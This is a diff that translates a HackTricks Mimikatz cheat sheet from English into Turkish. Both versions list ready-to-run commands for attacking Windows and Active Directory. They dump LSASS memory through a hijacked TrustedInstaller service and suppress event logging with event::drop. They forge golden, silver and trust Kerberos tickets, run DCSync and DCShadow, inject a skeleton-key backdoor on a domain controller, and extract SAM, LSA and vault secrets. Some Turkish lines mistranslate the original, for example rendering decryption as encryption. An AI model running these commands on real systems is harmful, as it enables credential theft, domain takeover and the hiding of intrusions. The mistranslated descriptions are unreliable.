@@ -2,219 +2,208 @@
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahramana kadar AWS hacklemeyi öğrenin<strong>!</strong></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* Bir **cybersecurity şirketinde** çalışıyor musunuz? **Şirketinizi HackTricks'te reklamını görmek** ister misiniz? veya **PEASS'ın en son sürümüne veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuz olan özel [**NFT'leri**](https://opensea.io/collection/the-peass-family) keşfedin
+* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) alın
+* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter**'da takip edin 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Hacking hilelerinizi** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ve** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **göndererek paylaşın**.
 
 </details>
 
-**This page is based on one from [adsecurity.org](https://adsecurity.org/?page\_id=1821)**. Check the original for further info!
+**Bu sayfa [adsecurity.org](https://adsecurity.org/?page\_id=1821)**'den alınmıştır. Daha fazla bilgi için orijinal sayfaya bakın!
 
-## LM and Clear-Text in memory
+## Bellekte LM ve Açık Metin
 
-From Windows 8.1 and Windows Server 2012 R2 onwards, significant measures have been implemented to safeguard against credential theft:
+Windows 8.1 ve Windows Server 2012 R2'den itibaren, kimlik bilgilerinin çalınmasına karşı önemli önlemler alınmıştır:
 
-- **LM hashes and plain-text passwords** are no longer stored in memory to enhance security. A specific registry setting, _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ must be configured with a DWORD value of `0` to disable Digest Authentication, ensuring "clear-text" passwords are not cached in LSASS.
+- **LM hash'leri ve açık metin parolaları**, güvenliği artırmak için artık bellekte depolanmamaktadır. "Açık metin" parolalarının LSASS'ta önbelleğe alınmamasını sağlamak için belirli bir kayıt defteri ayarı olan _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ DWORD değeri `0` olarak yapılandırılmalıdır.
 
-- **LSA Protection** is introduced to shield the Local Security Authority (LSA) process from unauthorized memory reading and code injection. This is achieved by marking the LSASS as a protected process. Activation of LSA Protection involves:
-    1. Modifying the registry at _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ by setting `RunAsPPL` to `dword:00000001`.
-    2. Implementing a Group Policy Object (GPO) that enforces this registry change across managed devices.
+- **LSA Koruma**, Yerel Güvenlik Otoritesi (LSA) işlemini yetkisiz bellek okuması ve kod enjeksiyonundan korumak için tanıtılmıştır. Bu, LSASS'ı korunan bir işlem olarak işaretleyerek gerçekleştirilir. LSA Koruma'nın etkinleştirilmesi şunları içerir:
+1. _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ kayıt defterinin `RunAsPPL` değerini `dword:00000001` olarak ayarlamak.
+2. Bu kayıt defteri değişikliğini yönetilen cihazlar üzerinde zorunlu kılan bir Grup İlkesi Nesnesi (GPO) uygulamak.
 
-Despite these protections, tools like Mimikatz can circumvent LSA Protection using specific drivers, although such actions are likely to be recorded in event logs.
+Bu korumalara rağmen, Mimikatz gibi araçlar, belirli sürücüler kullanarak LSA Koruma'yı atlayabilir, ancak bu tür eylemler olay günlüklerinde kaydedilebilir.
 
-### Counteracting SeDebugPrivilege Removal
+### SeDebugPrivilege Kaldırmasına Karşı Önlem Alma
 
-Administrators typically have SeDebugPrivilege, enabling them to debug programs. This privilege can be restricted to prevent unauthorized memory dumps, a common technique used by attackers to extract credentials from memory. However, even with this privilege removed, the TrustedInstaller account can still perform memory dumps using a customized service configuration:
-
+Yöneticiler genellikle programları hata ayıklamak için SeDebugPrivilege'a sahiptir. Bu ayrıcalık, yetkisiz bellek dökümlerini önlemek için kısıtlanabilir, saldırganların bellekten kimlik bilgilerini çıkarmak için kullandığı yaygın bir tekniktir. Bununla birlikte, bu ayrıcalık kaldırılsa bile, TrustedInstaller hesabı özel bir hizmet yapılandırması kullanarak hafıza dökümleri yapabilir:
 ```bash
 sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
 sc start TrustedInstaller
 ```
-
-This allows the dumping of the `lsass.exe` memory to a file, which can then be analyzed on another system to extract credentials:
-
+Bu, `lsass.exe` belleğinin bir dosyaya dökülmesine olanak sağlar. Bu dosya daha sonra başka bir sistemde analiz edilerek kimlik bilgileri çıkarılabilir:
 ```
 # privilege::debug
 # sekurlsa::minidump lsass.dmp
 # sekurlsa::logonpasswords
 ```
+## Mimikatz Seçenekleri
 
-## Mimikatz Options
+Mimikatz'ta olay günlüğü manipülasyonu iki temel eylemi içerir: olay günlüklerini temizleme ve olay hizmetini yamalama (yeni olayların kaydedilmesini engellemek için). Aşağıda, bu eylemleri gerçekleştirmek için kullanılan komutlar bulunmaktadır:
 
-Event log tampering in Mimikatz involves two primary actions: clearing event logs and patching the Event service to prevent logging of new events. Below are the commands for performing these actions:
+#### Olay Günlüklerini Temizleme
 
-#### Clearing Event Logs
+- **Komut**: Bu eylem, kötü niyetli faaliyetleri izlemeyi zorlaştırmak için olay günlüklerini silmeyi amaçlar.
+- Mimikatz, standart belgelerinde olay günlüklerini doğrudan komut satırı aracılığıyla temizlemek için doğrudan bir komut sağlamaz. Bununla birlikte, olay günlüğü manipülasyonu genellikle belirli günlükleri temizlemek için Mimikatz dışında sistem araçları veya komut dosyaları kullanmayı içerir (örneğin, PowerShell veya Windows Olay Görüntüleyici kullanarak).
 
-- **Command**: This action is aimed at deleting the event logs, making it harder to track malicious activities.
-- Mimikatz does not provide a direct command in its standard documentation for clearing event logs directly via its command line. However, event log manipulation typically involves using system tools or scripts outside of Mimikatz to clear specific logs (e.g., using PowerShell or Windows Event Viewer).
+#### Deneysel Özellik: Olay Hizmetini Yamalama
 
-#### Experimental Feature: Patching the Event Service
+- **Komut**: `event::drop`
+- Bu deneysel komut, Olay Günlüğü Hizmeti'nin davranışını değiştirmek için tasarlanmıştır ve yeni olayların kaydedilmesini etkili bir şekilde engeller.
+- Örnek: `mimikatz "privilege::debug" "event::drop" exit`
 
-- **Command**: `event::drop`
-- This experimental command is designed to modify the Event Logging Service's behavior, effectively preventing it from recording new events.
-- Example: `mimikatz "privilege::debug" "event::drop" exit`
+- `privilege::debug` komutu, Mimikatz'ın sistem hizmetlerini değiştirmek için gerekli ayrıcalıklarla çalışmasını sağlar.
+- `event::drop` komutu, Olay Günlüğü hizmetini yamar.
 
-- The `privilege::debug` command ensures that Mimikatz operates with the necessary privileges to modify system services.
-- The `event::drop` command then patches the Event Logging service.
+### Kerberos Bilet Saldırıları
 
+### Golden Bilet Oluşturma
 
-### Kerberos Ticket Attacks
+Golden Bilet, etki alanı genelinde erişim taklitine izin verir. Ana komut ve parametreler:
 
-### Golden Ticket Creation
+- Komut: `kerberos::golden`
+- Parametreler:
+- `/domain`: Etki alanı adı.
+- `/sid`: Etki alanının Güvenlik Tanımlayıcısı (SID).
+- `/user`: Taklit edilecek kullanıcı adı.
+- `/krbtgt`: Etki alanının KDC hizmet hesabının NTLM karması.
+- `/ptt`: Bileti doğrudan belleğe enjekte eder.
+- `/ticket`: Bileti daha sonra kullanmak üzere kaydeder.
 
-A Golden Ticket allows for domain-wide access impersonation. Key command and parameters:
-
-- Command: `kerberos::golden`
-- Parameters:
-  - `/domain`: The domain name.
-  - `/sid`: The domain's Security Identifier (SID).
-  - `/user`: The username to impersonate.
-  - `/krbtgt`: The NTLM hash of the domain's KDC service account.
-  - `/ptt`: Directly injects the ticket into memory.
-  - `/ticket`: Saves the ticket for later use.
-
-Example:
-
+Örnek:
 ```bash
 mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
 ```
+### Silver Bilet Oluşturma
 
-### Silver Ticket Creation
+Silver Biletler, belirli hizmetlere erişim sağlar. Anahtar komut ve parametreler:
 
-Silver Tickets grant access to specific services. Key command and parameters:
+- Komut: Altın Bilet'e benzer, ancak belirli hizmetlere yöneliktir.
+- Parametreler:
+- `/service`: Hedeflenen hizmet (örneğin, cifs, http).
+- Diğer parametreler Altın Bilet'e benzer.
 
-- Command: Similar to Golden Ticket but targets specific services.
-- Parameters:
-  - `/service`: The service to target (e.g., cifs, http).
-  - Other parameters similar to Golden Ticket.
-
-Example:
-
+Örnek:
 ```bash
 mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
 ```
+### Güven Bileti Oluşturma
 
-### Trust Ticket Creation
+Güven Biletleri, güven ilişkilerini kullanarak alanlar arası kaynaklara erişim sağlamak için kullanılır. Ana komut ve parametreler:
 
-Trust Tickets are used for accessing resources across domains by leveraging trust relationships. Key command and parameters:
+- Komut: Güven ilişkileri için Altın Bilet'e benzer.
+- Parametreler:
+- `/target`: Hedef alanın FQDN'si.
+- `/rc4`: Güven hesabının NTLM özeti.
 
-- Command: Similar to Golden Ticket but for trust relationships.
-- Parameters:
-  - `/target`: The target domain's FQDN.
-  - `/rc4`: The NTLM hash for the trust account.
-
-Example:
-
+Örnek:
 ```bash
 mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
 ```
+### Ek Kerberos Komutları
 
-### Additional Kerberos Commands
+- **Biletleri Listeleme**:
+- Komut: `kerberos::list`
+- Geçerli kullanıcı oturumu için tüm Kerberos biletlerini listeler.
 
-- **Listing Tickets**:
-  - Command: `kerberos::list`
-  - Lists all Kerberos tickets for the current user session.
+- **Önbelleği Geçme**:
+- Komut: `kerberos::ptc`
+- Önbellek dosyalarından Kerberos biletlerini enjekte eder.
+- Örnek: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`
 
-- **Pass the Cache**:
-  - Command: `kerberos::ptc`
-  - Injects Kerberos tickets from cache files.
-  - Example: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`
+- **Bileti Geçme**:
+- Komut: `kerberos::ptt`
+- Başka bir oturumda Kerberos bileti kullanmayı sağlar.
+- Örnek: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`
 
-- **Pass the Ticket**:
-  - Command: `kerberos::ptt`
-  - Allows using a Kerberos ticket in another session.
-  - Example: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`
-
-- **Purge Tickets**:
-  - Command: `kerberos::purge`
-  - Clears all Kerberos tickets from the session.
-  - Useful before using ticket manipulation commands to avoid conflicts.
+- **Biletleri Temizleme**:
+- Komut: `kerberos::purge`
+- Oturumdaki tüm Kerberos biletlerini temizler.
+- Çakışmaları önlemek için bilet manipülasyon komutları kullanmadan önce kullanışlıdır.
 
 
-### Active Directory Tampering
+### Active Directory Manipülasyonu
 
-- **DCShadow**: Temporarily make a machine act as a DC for AD object manipulation.
-  - `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`
+- **DCShadow**: Geçici olarak bir makineyi AD nesne manipülasyonu için bir DC gibi çalıştırır.
+- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`
 
-- **DCSync**: Mimic a DC to request password data.
-  - `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`
+- **DCSync**: Şifre verilerini istemek için bir DC'yi taklit eder.
+- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`
 
-### Credential Access
+### Kimlik Bilgilerine Erişim
 
-- **LSADUMP::LSA**: Extract credentials from LSA.
-  - `mimikatz "lsadump::lsa /inject" exit`
+- **LSADUMP::LSA**: LSA'dan kimlik bilgilerini çıkarır.
+- `mimikatz "lsadump::lsa /inject" exit`
 
-- **LSADUMP::NetSync**: Impersonate a DC using a computer account's password data.
-  - *No specific command provided for NetSync in original context.*
+- **LSADUMP::NetSync**: Bir bilgisayar hesabının şifre verilerini kullanarak bir DC'yi taklit eder.
+- *NetSync için özel bir komut sağlanmamıştır.*
 
-- **LSADUMP::SAM**: Access local SAM database.
-  - `mimikatz "lsadump::sam" exit`
+- **LSADUMP::SAM**: Yerel SAM veritabanına erişim sağlar.
+- `mimikatz "lsadump::sam" exit`
 
-- **LSADUMP::Secrets**: Decrypt secrets stored in the registry.
-  - `mimikatz "lsadump::secrets" exit`
+- **LSADUMP::Secrets**: Kayıt defterinde depolanan şifreleri şifreler.
+- `mimikatz "lsadump::secrets" exit`
 
-- **LSADUMP::SetNTLM**: Set a new NTLM hash for a user.
-  - `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`
+- **LSADUMP::SetNTLM**: Bir kullanıcı için yeni bir NTLM karma değeri belirler.
+- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`
 
-- **LSADUMP::Trust**: Retrieve trust authentication information.
-  - `mimikatz "lsadump::trust" exit`
+- **LSADUMP::Trust**: Güven ilişkisi kimlik doğrulama bilgilerini alır.
+- `mimikatz "lsadump::trust" exit`
 
-### Miscellaneous
+### Çeşitli
 
-- **MISC::Skeleton**: Inject a backdoor into LSASS on a DC.
-  - `mimikatz "privilege::debug" "misc::skeleton" exit`
+- **MISC::Skeleton**: Bir DC'deki LSASS'a bir arka kapı enjekte eder.
+- `mimikatz "privilege::debug" "misc::skeleton" exit`
 
-### Privilege Escalation
+### Yetki Yükseltme
 
-- **PRIVILEGE::Backup**: Acquire backup rights.
-  - `mimikatz "privilege::backup" exit`
+- **PRIVILEGE::Backup**: Yedekleme haklarını elde eder.
+- `mimikatz "privilege::backup" exit`
 
-- **PRIVILEGE::Debug**: Obtain debug privileges.
-  - `mimikatz "privilege::debug" exit`
+- **PRIVILEGE::Debug**: Hata ayıklama ayrıcalıklarını elde eder.
+- `mimikatz "privilege::debug" exit`
 
-### Credential Dumping
+### Kimlik Bilgilerini Sızdırma
 
-- **SEKURLSA::LogonPasswords**: Show credentials for logged-on users.
-  - `mimikatz "sekurlsa::logonpasswords" exit`
+- **SEKURLSA::LogonPasswords**: Oturum açmış kullanıcıların kimlik bilgilerini gösterir.
+- `mimikatz "sekurlsa::logonpasswords" exit`
 
-- **SEKURLSA::Tickets**: Extract Kerberos tickets from memory.
-  - `mimikatz "sekurlsa::tickets /export" exit`
+- **SEKURLSA::Tickets**: Bellekten Kerberos biletlerini çıkarır.
+- `mimikatz "sekurlsa::tickets /export" exit`
 
-### Sid and Token Manipulation
+### Sid ve Token Manipülasyonu
 
-- **SID::add/modify**: Change SID and SIDHistory.
-  - Add: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
-  - Modify: *No specific command for modify in original context.*
+- **SID::add/modify**: SID ve SIDHistory'yi değiştirir.
+- Ekle: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
+- Değiştir: *Değiştirme için özel bir komut sağlanmamıştır.*
 
-- **TOKEN::Elevate**: Impersonate tokens.
-  - `mimikatz "token::elevate /domainadmin" exit`
+- **TOKEN::Elevate**: Tokenları taklit eder.
+- `mimikatz "token::elevate /domainadmin" exit`
 
-### Terminal Services
+### Terminal Hizmetleri
 
-- **TS::MultiRDP**: Allow multiple RDP sessions.
-  - `mimikatz "ts::multirdp" exit`
+- **TS::MultiRDP**: Birden fazla RDP oturumuna izin verir.
+- `mimikatz "ts::multirdp" exit`
 
-- **TS::Sessions**: List TS/RDP sessions.
-  - *No specific command provided for TS::Sessions in original context.*
+- **TS::Sessions**: TS/RDP oturumlarını listeler.
+- *TS::Sessions için özel bir komut sağlanmamıştır.*
 
 ### Vault
 
-- Extract passwords from Windows Vault.
-  - `mimikatz "vault::cred /patch" exit`
+- Windows Vault'tan şifreleri çıkarır.
+- `mimikatz "vault::cred /patch" exit`
 
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmaya kadar AWS hackleme öğrenin</summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* Bir **cybersecurity şirketinde** çalışıyor musunuz? **Şirketinizi HackTricks'te reklamını görmek** ister misiniz? veya **PEASS'ın en son sürümüne erişmek veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
+* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family), özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonunu keşfedin.
+* [**Resmi PEASS & HackTricks ürünlerine**](https://peass.creator-spring.com) göz atın.
+* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
+* **Hacking hilelerinizi** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ve** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ile PR göndererek paylaşın**.
 
 </details>
